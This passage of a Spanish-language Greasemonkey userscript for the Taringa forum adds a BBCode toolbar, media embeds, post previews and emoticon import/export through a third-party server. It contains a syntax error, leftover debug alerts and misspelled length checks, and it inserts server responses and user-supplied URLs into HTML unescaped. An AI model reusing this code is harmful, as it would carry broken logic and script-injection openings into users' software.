function CrearBarraEmoticones(){
	GM_addStyle(".SharkaleEmoticones img {max-width:40px;max-height:40px;}");
	var URLtaringa = 'http://i.t.net.ar/images/smiles/';
	var nuevaHTML = '<div id="Sharkale_TaringaEmoticones" align="center" class="SharkaleEmoticones" style="display:'+(EmotVis == true? 'block':'none')+'"><br><br>';
	var emot = obtenerEmoticones();
	for (var i = 0; i < emot.length; i=i+2){
		nuevaHTML += '<a href="" onclick="insertarBBC(\' '+emot[i]+' \');return false;"><img src="'+emot[i+1]+'" alt="" title="" border="0"></a>&nbsp;';
	}
	nuevaHTML += "</div>";
	return nuevaHTML;
}

function Exportar_Emoticones(){
	var emot = GM_getValue('emoticones', '');
	if(emot == '') {
		unsafeWindow.mydialog.alert('Exportar Emoticones...','No tiene emoticones para exportar.');
		return true;
	}
	unsafeWindow.mydialog.procesando_inicio('','Exportando emoticones...');
	$('#mask').css('z-index','2000');
	$('#dialog').css('z-index','2001');
	GM_xmlhttpRequest({
		method: 'POST',
		//url: 'http://www.sharkale.com.ar/bbcoder/tp/create.php',
		//url : 'http://localhost/joomlayasser/index.php?option=com_bbcodes&task=crearPackEmoticones&',
		url : 'http://sandinosaso.webcindario.com/bbCodeReloaded/index.php?option=com_bbcodes&task=crearPackEmoticones&',
		data: 'pack='+user+'&user='+user+'&paste='+encodeURIComponent(emot),
		headers: {'Content-type':'application/x-www-form-urlencoded'},
		onload: function(h) {
			//h = h.responseText;
			var respuesta = $('<div id="respuesta">'+h+'</div>').find('div[id="resultado_creacion_pack"]').html();
				
			switch(respuesta.charAt(0)){
				case '0': //Error
					unsafeWindow.mydialog.alert('Emoticones Exportados','<h2 style="text-shadow:2px 2px 1px #999">'+respuesta.substring(2)+'</h2>');
					break;
				case '1': //Creado
					unsafeWindow.mydialog.alert('Emoticones Exportados','<h2 style="text-shadow:2px 2px 1px #999">C&oacute;digo de Referencia a sus emoticones: <span style="color:red">'+respuesta.substring(2)+'</span></h2>');
					break;
			}
		},
		onerror: function(h) {
			unsafeWindow.mydialog.alert('Emoticones no exportados','Hubo un error al guardar sus emoticones.');
		},
		onreadystatechange: function(h) {
			if(h.readyState == 4) unsafeWindow.mydialog.procesando_fin();
		}
	});
}

function Importar_Emoticones(pack){
	var id = prompt('Código de referencia '+(pack? 'al pack de':'de los')+' emoticones');
	unsafeWindow.mydialog.procesando_inicio('','Obteniendo '+(pack? 'pack de ':'')+'emoticones...');
	$('#mask').css('z-index','2000');
	$('#dialog').css('z-index','2001');
	$.timer(1000,function(timer){
		timer.stop();
		GM_xmlhttpRequest({
			method: 'POST',
			//url: 'http://www.sharkale.com.ar/bbcoder/tp/get.php',
			//url: 'http://localhost/joomlayasser/index.php?option=com_bbcodes&task=getPackEmoticones&',
			url : 'http://sandinosaso.webcindario.com/bbCodeReloaded/index.php',
			data: 'option=com_bbcodes&task=getPackEmoticones&id='+encodeURIComponent(id)+(pack? '&script=1':''),
			headers: {'Content-type':'application/x-www-form-urlencoded'},
			onload: function(h) {
				var respuesta2 = $('<div id="respuesta">'+h+'</div>').html();
				var respuesta = $('<div id="respuesta">'+h+'</div>').find('div[id="resultado_creacion_pack"]').html();
				alert("h:"+h+);
				alert("respuesta:"+respuesta+" respuesta2:"+respuesta2);
				if(respuesta == 'paste_no_exist' || respuesta.substring(0,14) != 'Emot_Sharkale:' || respuesta.substring(14).lenght < 20){
					unsafeWindow.mydialog.alert('Importar'+(pack? ' pack de ':' ')+'Emoticones','No hay '+(pack? 'pack de ':'')+'emoticones asignados a ese código de referencia.');
				}else{
					unsafeWindow.mydialog.alert((pack? 'Pack de ':'')+'Emoticones Importados',(pack? 'El pack de':'Los')+' emoticones '+(pack? 'fue':'fueron')+' importado'+(pack? '':'s')+' satisfactoriamente.<br><br>Si desea conservarlos tienes que guardar los cambios, de lo contrario permanecerán los viejos emoticones.');
					if(pack)
						$('#emoticones_personalizados').append(Cargar_Emoticones(respuesta.substring(14).split(',')));
					else
						$('#emoticones_personalizados').html(Cargar_Emoticones(respuesta.substring(14).split(',')));
				}
			},
			onerror: function(resultado) {
				unsafeWindow.mydialog.alert('Importar'+(pack? ' pack de ':' ')+'Emoticones','Hubo un error al obtener '+(pack? 'el pack de':'los')+' emoticones.');
			},
			onreadystatechange: function(resultado) {
				if(resultado.readyState == 4) unsafeWindow.mydialog.procesando_fin();
			}
		});
	})
}

function Cargar_Emoticones(lista){
	var emot = lista||obtenerEmoticones();
	var nroemot = 0;
	GM_addStyle('#emoticones_personalizados span{width: 54px; height: 45px;margin:5px}');
	html = '';
	for (var i = 0; i < emot.length; i=i+2){
		nroemot++;
		html += '<span id="shark_emot_'+nroemot+'" class="ui-state-default"><img src="'+emot[i+1]+'" alt="" title="'+emot[i]+'" style="height:40px;width:40px;"><a href="" onclick="$(\'#shark_emot_'+nroemot+'\').remove();return false;"><img src="'+urlimg+'borrar.gif" alt="Eliminar" title="Eliminar" height="12" width="12"></a><input type="hidden" name="sharkale_emot_'+nroemot+'" value="'+emot[i]+'"><input type="hidden" name="sharkale_emot_'+nroemot+'" value="'+emot[i+1]+'"></span>';
	}
	return html;
}

function Agregar_Emoticones(){
	var urlbarra = prompt('Ingrese la dirección URL válida del emoticon que será mostrado en tu barra.');
	if(urlbarra != '' && urlbarra != null){
		if(urlbarra.search(/^https?:\/\//gi) != -1 && urlbarra.search(/,/) == -1){
			var urlemot = prompt('Ingrese la dirección URL válida del emoticon que será mostrado a los demás.');
			if(urlemot != '' && urlemot != null){
				if(urlemot.search(/^https?:\/\//gi) != -1 && urlemot.search(/,/) == -1){
					nuevosemot++;
					html = '<span id="shark_emot_nueva_'+nuevosemot+'" class="ui-state-default"><img src="'+urlbarra+'" alt="" title="[img='+urlemot+']" style="height:40px;width:40px;"><a href="" onclick="$(\'#shark_emot_nueva_'+nuevosemot+'\').remove();return false;"><img src="'+urlimg+'borrar.gif" alt="Eliminar" title="Eliminar" height="12" width="12"></a><input type="hidden" name="sharkale_emot_nueva_'+nuevosemot+'" value="[img]'+urlemot+'[/img]"><input type="hidden" name="sharkale_emot_nueva_'+nuevosemot+'" value="'+urlbarra+'"></span>';
					$('#emoticones_personalizados').append(html);
				}else{
					alert('La dirección URL del emoticon es inválida.\n\nAsegurese de que comienza con "http://" y que no contiene comas ","');
				}
			}
		}else{
			alert('La dirección URL del emoticon es inválida.\n\nAsegurese de que comienza con "http://" y que no contiene comas ","');
		}	
	}
}

function Guardar_Emoticones(){
	if(confirm('¿Está seguro que desea guardar los cambios en los emoticones?\n\nEste cambio es permanente.')){
		var input = document.getElementsByTagName('input');
		window.emots=Array();
		for(var i=0; i<input.length; i++){
			var o = input.item(i);
			if(o.type=='hidden' && o.name.search(/sharkale_emot/gi) != -1){
				var emot = o.value;
				emots[emots.length] = emot;
			}
		}
		GM_setValue('emoticones', emots.toString());
	}
}
//id pack oficial 6a32f lo cambie por acbd3  porque el oficial ta muerto

function Reestablecer_Emoticones(){
	unsafeWindow.mydialog.procesando_inicio('','Obteniendo Emoticones Orignales...');
	$('#mask').css('z-index','2000');
	$('#dialog').css('z-index','2001');
	$.timer(1000,function(timer){
		timer.stop();
		GM_xmlhttpRequest({
			method: 'POST',
			//url: 'http://www.sharkale.com.ar/bbcoder/tp/get.php',
			//url:'http://localhost/joomlayasser/index.php?option=com_bbcodes&task=getPackEmoticones&id=1&script=1',
			url : 'http://sandinosaso.webcindario.com/bbCodeReloaded/index.php?option=com_bbcodes&task=getPackEmoticones&id=1&script=1',
			//data: 'id=acbd3&script=1',
			headers: {'Content-type':'application/x-www-form-urlencoded'},
			onload: function(h) {
				var respuesta = $('<div id="respuesta">'+$(h)+'</div>').find('div[id="resultado_creacion_pack"]').html();
				
				if(respuesta == 'paste_no_exist' || respuesta.substring(0,14) != 'Emot_Sharkale:' || respuesta.substring(14).lenght < 20){
					unsafeWindow.mydialog.alert('Importar Emoticones Orignales','Hubo un error al obtener los emoticones originales.<br><br>Si el problema persiste comunicarlo en la comunidad del Script.');
				}else{
					unsafeWindow.mydialog.alert('Emoticones Orignales','Los emoticones originales fueron importados satisfactoriamente.<br><br>Si desea conservarlos tienes que guardar los cambios, de lo contrario permanecerán los viejos emoticones.');
					$('#emoticones_personalizados').html(Cargar_Emoticones(respuesta.substring(14).split(',')));
				}
			},
			onerror: function(resultado) {
				unsafeWindow.mydialog.alert('Importar Emoticones Orignales','Hubo un error al obtener los emoticones originales.');
			},
			onreadystatechange: function(resultado) {
				if(resultado.readyState == 4) unsafeWindow.mydialog.procesando_fin();
			}
		});
	})
}

// ==/Funciones==

// ==Funciones que serán agregadas a la página==
function AgregarFuncionesenWeb(){

Taringa_Set_Function("$$", function(elm_id){return document.getElementById(elm_id);});

Taringa_Set_Function("botonPrompt", function(tipo){
var inicio = txt.selectionStart;
var fin   = txt.selectionEnd;
var seleccion = txt.value.substring(inicio, fin);
switch (tipo){
case 'vyoutube': //YouTube
	var msg = prompt("Ingrese la dirección del video de YouTube:");
	if(msg != '' && msg != null){
		var regexp = /(?:youtube\.com\/(?:watch\?v\=|v\/)[\w|\-]*)/i;
		var enc = regexp.exec(msg);
		if (enc != null) {
			regexp = /(?:v[\/|=][\w|-]*)/i;
			enc = enc[0].match(regexp);
			if (enc != null) msg = enc[0].substring(2);
		}
		if(msg.length < 5 || msg.length > 20) {
			alert("Dirección del video inválida");
		} else {
			unsafeWindow.insertarBBC('[swf]http://www.youtube.com/v/' + msg + '[/swf]\nFuente: [url]http://www.youtube.com/watch?v='+msg+'[/url]');
		}
	}
	break;
case 'vgoogle': //Google Video
	var msg = prompt("Ingrese la dirección del video de Google:");
	if(msg != '' && msg != null){
		var regexp = /(?:video\.google\.com\/(?:videoplay|googleplayer\.swf)\?docid\=[\w|-]*)/i;
		var enc = regexp.exec(msg);
		if (enc != null) {
			regexp = /(?:\=[\w|-]*)/;
			enc = enc[0].match(regexp);
			if (enc != null) msg = enc[0].substring(1);
		}
		if(msg.length < 5 || msg.length > 25)
			alert("Dirección del video inválida");
		else
			unsafeWindow.insertarBBC('[swf]http://video.google.com/googleplayer.swf?docId=' + msg + '[/swf]');
	}
	break;
case 'vmegavideo': //Megavideo
	var msg = prompt("Ingrese el código entero que provee la página a través del link \"Video Incrustado\" en cada video de MegaVideo:");
	if(msg != '' && msg != null){
		var regexp = /(megavideo\.com\/(?:v\/|\?v=)[\w|-]*)/i;
		var enc = regexp.exec(msg);
		if (enc != null) {
			regexp = /(?:v\/|v=)([\w]*)/;
			enc = enc[0].match(regexp);
			if (enc != null) msg = enc[0].substring(2);
		}
		if(msg.length < 5 || msg.length > 50)
			alert("Dirección del video inválida");
		else
			unsafeWindow.insertarBBC('[swf]http://www.megavideo.com/v/' + msg + '[/swf]');
	}
	break;
case 'mixpod': //Cancion MixPod
	var msg = prompt('Ingrese el Embed de la playlist de MixPod');
	if(msg != '' && msg != null){
		var regexp = /<embed src="([\s\S]*?)\"[\s\S]*flashvars="([\s\S]*?)\"[\s\S]*?>/gi;
		var enc = regexp.exec(msg);
		if (enc != null && enc[1] != null && enc[2] != null) {
			msg = enc[1]+'&'+enc[2].replace('mycolor=','&mycolor=');
			if(msg.length < 30 || msg.indexOf("/") == -1){
				alert("Dirección de la música inválida");
			} else {
				unsafeWindow.insertarBBC('[swf]' + msg + '[/swf]');
			}
		}else alert("Dirección de la música inválida");
	}
	break;
case 'goear': //Cancion GoEar
	var msg = prompt("Ingrese la dirección URL ó el código HTML ó la ID de la canción deseada de GoEar:");
	if(msg != '' && msg != null){
		var regexp = /file=([\w]*)/i;
		var enc = regexp.exec(msg);
		if (enc != null) {
			if (enc[1] != null) msg = enc[1];
		}else{
			regexp = /listen\/([\w]*)/i;
			enc = regexp.exec(msg);
			if (enc != null) {
				if (enc[1] != null) msg = enc[1];
			}else msg='';
		}
		if(msg.length < 5 || msg.length > 15)
			alert("Dirección de la música inválida");
		else
			unsafeWindow.insertarBBC('[swf]http://www.goear.com/files/external.swf?file='+msg+'[/swf]\nFuente: [url]http://goear.com/listen/'+msg+'/[/url]');
	}
	break;
case 'esnips': //Cancion MP3
	var msg = prompt("Ingrese la dirección \"URL\" de la canción proporcionada por eSnips:\n\nEjemplo:\nhttp://www.esnips.com/doc/01f6cd69-e218-4faa-8f1c-1e5cc0cc4111/Rodrigo - La Mano De Dios");
	if(msg != '' && msg != null){
		var regexp = /(?:doc\/[\w|\-|\/]*)/i;
		var enc = regexp.exec(msg);
		if (enc != null && enc[0].substring(4).indexOf('/') != -1) {
			msg = enc[0].substring(4);
			if(msg.length < 30 || msg.indexOf("/") == -1){
				alert("Dirección de la música inválida");
			} else {
				var params = msg.split("/",2);
				unsafeWindow.insertarBBC('[swf]http://www.esnips.com/escentral/images/widgets/flash/player_dj.swf?autoPlay=no&theFile=http://www.esnips.com/nsdoc/' + params[0] + '&theName=' + params[1] + '&thePlayerURL=http://www.esnips.com/escentral/images/widgets/flash/mp3WidgetPlayer.swf[/swf]');
			}
		} else {
			regexp = /(?:doc\/[\w|\-]*\&amp\;[\w|\ |\-|\=]*)/i;
			enc = regexp.exec(msg);
			if (enc != null) {
				msg = enc[0].substring(4);
				var params = msg.split("&amp;theName=",2);
				unsafeWindow.insertarBBC('[swf]http://www.esnips.com/escentral/images/widgets/flash/player_dj.swf?autoPlay=no&theFile=http://www.esnips.com/nsdoc/' + params[0] + '&theName=' + params[1] + '&thePlayerURL=http://www.esnips.com/escentral/images/widgets/flash/mp3WidgetPlayer.swf[/swf]');
			}else alert("Dirección de la música inválida");
		}
	}
	break;
case '99polls': //Encuesta de 99polls
	var msg = prompt('Ingrese el EMBED de la encuesta proporcionada por 99polls');
	if(msg != '' && msg != null){
		var regexp = /<embed src="([\s\S]*?)\"[\s\S]*flashvars="&([\s\S]*?)\"[\s\S]*?>/gi;
		var enc = regexp.exec(msg);
		if (enc != null && enc[1] != null && enc[2] != null) {
			msg = enc[1]+'?'+enc[2];
			if(msg.length < 30 || msg.indexOf("/") == -1){
				alert("Dirección de la música inválida");
			} else {
				unsafeWindow.insertarBBC('[swf]' + msg + '[/swf]');
			}
		}else alert("Dirección de la música inválida");
	}
	break;
case 'swf': //Flash
    if(seleccion.substring(0,7) != 'http://'){
		var msg = prompt("Ingrese la dirección URL del archivo SWF",'http://');
		if(msg != '' && msg != null)
			unsafeWindow.insertarBBC('[swf]' + msg + '[/swf]\nFuente: [url]'+msg+'[/url]');
    } else unsafeWindow.insertarBBC('[swf]','[/swf]');
	break;
case 'quote': //Cita
	if(seleccion.length > 0){
		unsafeWindow.insertarBBC('[quote]', '[/quote]');
	}else{
		var msg = prompt("Ingrese el texto a citar");
		if(msg != '' && msg != null) unsafeWindow.insertarBBC('[quote]' + msg + '[/quote]');
	}
	break;
case 'image': //Imagen
    if(seleccion.substring(0,7) != 'http://'){
	var msg = prompt("Ingrese la dirección URL completa de la imágen",'http://');
	if(msg != '' && msg != null)
		unsafeWindow.insertarBBC('[img]' + msg + '[/img]');
    } else unsafeWindow.insertarBBC('[img]','[/img]');
	break;
case 'imageclick': //Imagen clickeable
    var msg = prompt("Ingrese la dirección URL completa de la imágen",'http://');
    if(msg != '' && msg != null){
	var msg2 = prompt("Ingrese la dirección URL completa del link",'http://');
	if(msg2 != '' && msg2 != null)
		unsafeWindow.insertarBBC('[url='+msg2+'][img]' + msg + '[/img][/url]');
    }
	break;
case 'link': //Link
    if(seleccion.substring(0,7) != 'http://'){
	var msg = prompt("Ingrese la URL que desea postear",'http://');
	if(msg != '' && msg != null){
		if(inicio == fin) {
		   var msg2 = prompt("¿Desea agregarle una etiqueta a la URL?");
		   if(msg2 != '' && msg2 != null)
			unsafeWindow.insertarBBC('[url='+msg+']'+msg2+'[/url]')
		   else
			unsafeWindow.insertarBBC('[url]'+msg+'[/url]');
		} else
			unsafeWindow.insertarBBC('[url='+msg+']','[/url]');
	}
    } else unsafeWindow.insertarBBC('[url]','[/url]');
	break;
case 'url2bbc': //Link
	if(!confirm('¿Estás seguro que deseas agregarle BBC a todas las URL\'s?\n\nPuede no funcionar correctamente con algunas URL.')) return;
	var scrollTop = txt.scrollTop;
	var regex = /((?:https?|ftp):\/\/[^\s'"'<>()]*|[-\w.+]+@(?:[-\w]+\.)+[\w]{2,6})/gi;
	txt.value = txt.value.replace(regex, "[url]$1[/url]");
	regex = /((?:\[url=\w+\]))([url])/gi
	txt.value = txt.value.replace(regex, "$1");
	regex = /\[\/url]\[\/url\]/gi
	txt.value = txt.value.replace(regex, "[/url]");
	regex = /\[url]\[url\]/gi
	txt.value = txt.value.replace(regex, "[url]");
	regex = /\[img\]\[url\]/gi
	txt.value = txt.value.replace(regex, "[img]");
	regex = /\[\/url\]\[\/img\]/gi
	txt.value = txt.value.replace(regex, "[/img]");
	regex = /\[img=\[url\]/gi
	txt.value = txt.value.replace(regex, "[img=");
	txt.scrollTop = scrollTop;
	break;
case 'letrota': //Link
	unsafeWindow.mydialog.show();
	unsafeWindow.mydialog.title('Letrota - yasserock® rulez!');
	unsafeWindow.mydialog.body('<div class="modalForm" style="min-width:300px"><img id="letrotaImg" src"" title="Previsualización de la Letrota" style="max-width:740px" onload="mydialog.center()"/><div class="admin_user_center"><ul><li class="mBlock"><li class="mColLeft" style="width: 25%;">Texto:</li><li class="mColRight" style="width: 70%;"><textarea id="letrota_text" style="width: 200px;" title="Ingrese el texto aquí" onkeyup="$(\'#letrotaImg\').attr(\'src\',\'http://superpatanegra.com/textoaimagen/images/email_imager.php?e=\'+encodeURIComponent($(\'#letrota_text\').val())+\'&fs=\'+$(\'#fs\').val()+\'&f=\'+$(\'#f\').val()+\'&c=^\'+$(\'#c\').val());"></textarea></li><li class="cleaner"></li></li><li class="mBlock"><li class="mColLeft" style="width: 25%;">Fuente:</li><li class="mColRight" style="width: 70%;"><select name="fs" id="fs" onchange="$(\'#letrotaImg\').attr(\'src\',\'http://superpatanegra.com/textoaimagen/images/email_imager.php?e=\'+encodeURIComponent($(\'#letrota_text\').val())+\'&fs=\'+$(\'#fs\').val()+\'&f=\'+$(\'#f\').val()+\'&c=^\'+$(\'#c\').val());"><option value="4">4</option><option value="8">8</option><option value="12">12</option><option value="18">18</option><option selected="" value="24">24</option><option value="32">32</option><option value="48">48</option><option value="64">64</option></select>pt <select name="f" id="f" onchange="$(\'#letrotaImg\').attr(\'src\',\'http://superpatanegra.com/textoaimagen/images/email_imager.php?e=\'+encodeURIComponent($(\'#letrota_text\').val())+\'&fs=\'+$(\'#fs\').val()+\'&f=\'+$(\'#f\').val()+\'&c=^\'+$(\'#c\').val());"><option value="arial">Arial</option><option value="arlrdbd">Arial Rounded</option><option value="bauhs93">Bauhuas 93</option><option value="britanic">Britannic Bold</option><option value="castelar">Castellar</option><option value="felixti">Felix Titling</option><option value="monofont">Monofont</option><option value="outlook">MS Outlook</option><option value="pertibd">Perpetua Titling MT</option><option value="playbill">Playbill</option><option value="rockeb">Rockwell Extra Bold</option><option value="wingdng3">Windings 3</option><option value="latinwd">Wide Latin</option></select></li><li class="cleaner"></li></li><li class="mBlock"><li class="mColLeft" style="width: 25%;">Color:</li><li class="mColRight" style="width: 70%;"><input id="c" class="iTxt" type="text" value="FF0000" onkeyup="$(\'#letrotaImg\').attr(\'src\',\'http://superpatanegra.com/textoaimagen/images/email_imager.php?e=\'+encodeURIComponent($(\'#letrota_text\').val())+\'&fs=\'+$(\'#fs\').val()+\'&f=\'+$(\'#f\').val()+\'&c=^\'+$(\'#c\').val());" maxlength="6" style="width:40px"><a href="http://www.webtaller.com/utilidades/csscoder/colores.php" target="_blank" style="padding:0px 13px">Tabla de Códigos de Colores</a></li><li class="cleaner"></li></ul></div></div>');
	unsafeWindow.mydialog.buttons(true, true, 'Aceptar', "insertarBBC('[img]http://superpatanegra.com/textoaimagen/images/email_imager.php?e='+encodeURIComponent($('#letrota_text').val())+'&fs='+$('#fs').val()+'&f='+$('#f').val()+'&c=^'+$('#c').val()+'[/img]');mydialog.close();", true, false, true, 'Cancelar', 'close', true, true);
	unsafeWindow.mydialog.center();
	break;
}
});

Taringa_Set_Function("insertarBBC", function(TagAntes,TagDespues){
	if(txt.value == txt.title) txt.value = '';
	if(TagDespues == 'bbcperso') {
		TagAntes = Base64.decode(TagAntes);
		TagDespues = undefined;
	}
	var inicio = txt.selectionStart;
	var fin   = txt.selectionEnd;
	var txtlength = 0;
	var seleccion = '';
	var seleccionAntes = '';
	var seleccionDespues = '';
	var scrollTop = txt.scrollTop;
	if (TagDespues == null) {
		txt.value = txt.value.substr(0, inicio) + TagAntes + txt.value.substr(fin, txt.value.length);
		txt.focus();
		txt.selectionStart = txt.value.substr(0, inicio).length + TagAntes.length;
		txt.selectionEnd = txt.value.substr(0, inicio).length + TagAntes.length;
		txt.scrollTop = scrollTop;
	}else{
		if (inicio == fin) {
			txt.value = txt.value.substr(0, inicio) + TagAntes + TagDespues + txt.value.substr(fin, txt.value.length);
			txt.focus();
			txt.selectionStart = txt.value.substr(0, inicio).length + TagAntes.length;
			txt.selectionEnd = txt.value.substr(0, inicio).length + TagAntes.length;
			txt.scrollTop = scrollTop;
		} else {
			txtlength = txt.value.length;
			seleccion = txt.value.substr(inicio, (fin - inicio));
			seleccionAntes = txt.value.substr(0, inicio);
			seleccionDespues = txt.value.substr(fin, txtlength);
			txt.value = seleccionAntes + TagAntes + seleccion + TagDespues + seleccionDespues;
			txt.focus();
			txt.selectionStart = seleccionAntes.length + TagAntes.length;
			txt.selectionEnd = txt.value.length - TagDespues.length - seleccionDespues.length;
			txt.scrollTop = scrollTop;
		}
	}
});

Taringa_Set_Function("preview", function(){
  if(txt.value == txt.title) return;
  if(path == 'mensajes' || path == 'comunidades' || path == 'comuagregar'){
	if(jQuery.trim(txt.value) == ''){
		$(".msg_add_comment").hide(1000).html("Debes escribir algo para realizar la previsualización").show(1000);
	} else {
		$(".msg_add_comment").slideUp(1000);
		$('#return_agregar_comentario').slideUp(1000, function(){
			var HTML = '<div id="Sharkale_TaringaBBC" style="text-align:center;">'; 
			HTML += '<br /><img src="'+URL+'cargando.gif" alt="CARGANDO..." title="Cerrar Previsualización" border="0" /><br /><br />';
 			HTML += '<span style="font-weight: bold">Cerrar Previsualización</span><br /><br />';
			HTML += '</div>';
			$('#return_agregar_comentario').html(HTML).slideDown(1000, function(){ 
			$.ajax({
 					type: 'GET',
 					url: 'http://'+Dom+'/preview.php',
					dataType: 'text',
					data: 'titulo=Preview&cuerpo='+encodeURIComponent(txt.value),
 					success: function(h){
						respuesta = $('<div id="respuesta">'+h+'</div>').find('div[class="box_cuerpo"]').html();
						if(path == 'mensajes'){
							var HTML = '<br><div class="cita" style="color:#464646;text-shadow:0 1px 0 #CCCCCC;"><img src="'+URL+'cerrar.gif" alt="[X]" title="Cerrar Previsualización" border="0" onclick="($(\'#return_agregar_comentario\').slideUp(1000))" style="margin-right:5px" onmouseover="this.style.cursor=\'pointer\'" />Previsualización - yasserock® rulez!</div>';
							HTML += '<div class="citacuerpo">'+respuesta+'</div><br>';
						}else{
							var HTML = '<div class="respuesta clearfix"><div class="answerInfo"></div>';
							HTML += '<div class="answerTxt"><div class="answerContainer"><div class="Container" style="padding:0; width:640px !important;"><div class="answerOptions"><div class="floatL metaDataA"><img src="'+URL+'cerrar.gif" alt="[X]" title="Cerrar Previsualización" border="0" onclick="($(\'#return_agregar_comentario\').slideUp(1000))" align="absmiddle" style="margin-right:5px" onmouseover="this.style.cursor=\'pointer\'" />Previsualización - yasserock® rulez!</div></div><div style="margin: 10px !important; width:640px !important;" class="cuerpo_comm">'+respuesta+'</div></div></div></div></div>';
						}
 						$('#return_agregar_comentario').slideUp(1000, function(){
							$('#return_agregar_comentario').html(HTML).slideDown(1000); 
						});
 					},
 					error: function(h){
						$(".msg_add_comment").hide(1000, function(){
							$(".msg_add_comment").html('Hubo un error al previsualizar, Por favor intente nuevamente.').show(1000); 
					 	});
 					}
 			});
			})
		});
	}
  }else{
	if(jQuery.trim(txt.value) == '' || txt.value == $(txt).attr('title')){
		$(".miComentario .error").html("Debes escribir algo para realizar la previsualización").show('slow');
	} else {
		$(".miComentario .error").slideUp('slow');
		$('#post').slideUp(1500, function(){
			var HTML = '<div class="comentario-post clearbeta" style="text-align:center;"><div class="avatar-box">'+$('.miComentario .answerInfo').clone().html()+'</div>';
			HTML += '<div class="comment-box"><div class="dialog-c"></div><div class="comment-content">';
			HTML += '<br /><br /><img src="'+URL+'cargando.gif" alt="CARGANDO..." title="Cerrar Previsualización" border="0" /><br /><br />';
			HTML += '<span style="font-weight: bold">Cerrar Previsualización</span><br /><br />';
			HTML += '</div></div></div>';
			$('#post').html(HTML).slideDown(1500, function(){
				$.ajax({
					type: 'GET',
					url: 'http://'+Dom+'/preview.php',
					dataType: 'text',
					data: 'titulo=Preview&cuerpo='+encodeURIComponent(txt.value),
					success: function(h){
						respuesta = $('<div id="respuesta">'+h+'</div>').find('div[class="box_cuerpo"]').html();
						var HTML = '<div class="comentario-post clearbeta"><div class="avatar-box">'+$('.miComentario .answerInfo').clone().html()+'</div>';
						HTML += '<div class="comment-box"><div class="dialog-c"></div><div class="comment-info clearbeta"><div class="floatL"><img src="'+URL+'cerrar.gif" alt="[X]" align="absmiddle" title="Cerrar Previsualización" border="0" onclick="$(\'#post\').slideUp(1000)" style="margin-right:5px" onmouseover="this.style.cursor=\'pointer\'" /> <b>Previsualización - yasserock® rulez!</b></div></div><div class="comment-content">'+respuesta+'</div></div></div>';
						$('#post').slideUp(1500, function(){
							$('#post').html(HTML).slideDown(1500);
						});
					},
					error: function(h){
						$(".miComentario .error").hide(1500, function(){
							$(".miComentario .error").html('Hubo un error al previsualizar, Por favor intente nuevamente.').show('slow');
						});
					}
				});
			});
		});
	}
  }
});

if(path == 'comuagregar'){
Taringa_Set_Function("validate_form", function(form, elementos){

	var titulo = $(':text[dataname=Titulo]').val();
	var cuerpo = $(':text[dataname=Cuerpo]').val();
	var tags = $(':text[dataname=Tags]').val();
	var errores = '';
	
	if(cuerpo == ''){errores += '<li style="list-style-type:disc"> El tema está vacio.</li>';}
	if(titulo == ''){errores += '<li style="list-style-type:disc"> El tema no tiene título.</li>';}
	if(tags == ''){errores += '<li style="list-style-type:disc"> No se ingresaron los TAG\'s</li>';}else{
		var separar_tags = tags.split(",");separar_tags = unico(separar_tags);
		if(separar_tags.length < 4){errores += '<li style="list-style-type:disc"> Tiene que haber por lo menos 4 TAG\'s separados por coma y diferentes.</li>';}
	}
	if(errores != ''){
		unsafeWindow.mydialog.alert('Error al Crear Tema - yasserock® rulez!','<div align="left" style="padding:0px 20px"><b>Se han encontrado los siguientes errores:<br><br><ul style="margin-left:20px">'+errores+'</ul></b></div>');
		return false;
	}

});		
}
		
Taringa_Set_Function("show_preview", function(titulo,cuerpo,tags,f,forzar){
	var errores = '';
	if(cuerpo.length>63200){errores += '<li style="list-style-type:disc"> El post es demasiado largo. No debe exceder los 65000 caracteres.</li>';}
	if($(":radio:checked[name='categoria']:first").val() == -1){errores += '<li style="list-style-type:disc"> No se eligió la categoría.</li>';}
	if(cuerpo == ''){errores += '<li style="list-style-type:disc"> El post está vacio.</li>';}
	if(titulo == ''){errores += '<li style="list-style-type:disc"> El post no tiene título.</li>';}
	if(tags == ''){errores += '<li style="list-style-type:disc"> No se ingresaron los TAG\'s</li>';}else{
		var separar_tags = tags.split(",");separar_tags = unico(separar_tags);
		if(separar_tags.length < 4){errores += '<li style="list-style-type:disc"> Tiene que haber por lo menos 4 TAG\'s separados por coma y diferentes.</li>';}
	}
	if(errores != ''){
		unsafeWindow.mydialog.alert('Error al Crear Post - yasserock® rulez!','<div align="left" style="padding:0px 20px"><b>Se han encontrado los siguientes errores:<br><br><ul style="margin-left:20px">'+errores+'</ul></b></div>');
		return false;
	}
	
	if(forzar) return true;

	var HTML = '<div id="previsualizacion" style="text-align:center;">';
	HTML += '<br /><br /><img src="'+URL+'cargando.gif" alt="CARGANDO..." title="Cargando preview del post. Por favor espere." border="0" /><br /><br />';
	HTML += '<span style="font-weight: bold">Cargando preview del post. Por favor espere.</span><br /><br />';
	HTML += '</div>';
	$('#preview').html(HTML);
	$('#preview').css('display','inline');
	document.documentElement.scrollTop = 0;
	var params = 'titulo=' + encodeURIComponent(titulo) + '&cuerpo=' + encodeURIComponent(cuerpo);
	$.ajax({
		type: "POST",
		url: 'http://'+Dom+'/preview.php',
		data: params,
		success: function(h){
			$('#preview').html(h);
			$('#preview').css('display','inline');
		},
		error: function(h){
			$('#preview').html('');
			$('#preview').css('display','none');
			alert('Error al previsualizar! Intente nuevamente.');
		}
	});

	function kill_preview(){
		$('#preview').html('');
		$('#preview').css('display','none');
	}

});

var add_comment_enviado = false;
Taringa_Set_Function("add_comment", function(mostrar_resp, comentarionum){
	if(add_comment_enviado)
		return;
	var textarea = $('#body_comm');
	var text = textarea.val();

	if(text == '' || text == textarea.attr('title')){
		textarea.focus();
		return;
	}

	$('.miComentario #gif_cargando').show('slow');
	add_comment_enviado = true;
	$.ajax({
		type: 'POST',
		url: '/comentario3.php',
		data: 'comentario=' + encodeURIComponent(text) + '&lastid=' + unsafeWindow.lastid_comm + unsafeWindow.gget('postid') + unsafeWindow.gget('key') + '&mostrar_resp=' + mostrar_resp,
		success: function(h){
			switch(h.charAt(0)){
				case '0': //Error
					$('.miComentario .error').html(h.substring(3)).show('slow');
					break;
				case '1': //OK
					$('.no-comments').remove();
					$('#post').hide('slow');
					textarea.val('Escribir otra respuesta...').attr('title', 'Escribir otra respuesta...');
					$('#post-comentarios #comentarios').append('<div id="nuevos" style="display:none">'+h.substring(3)+'</div>');
					$('.avatar-48[width=48]').attr('width','56').attr('height','56');
					$('div.avatar-box').mouseenter(function(){ $(this).children('ul').show(); }).mouseleave(function(){ $(this).children('ul').hide() });
